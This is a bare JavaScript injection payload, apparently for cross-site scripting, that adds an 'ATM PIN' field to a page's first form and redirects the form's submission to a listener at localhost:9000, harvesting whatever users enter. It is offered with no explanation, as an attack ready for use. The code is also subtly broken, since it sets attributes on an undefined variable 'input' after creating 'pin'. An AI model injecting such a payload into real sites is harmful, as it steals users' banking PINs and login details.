<script>

var pin = document.createElement("input");

input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "pin");

var previous = document.forms[0].elements[0];

document.forms[0].insertBefore(pin, previous);
document.forms[0].action = 'http://localhost:9000/';

</script>
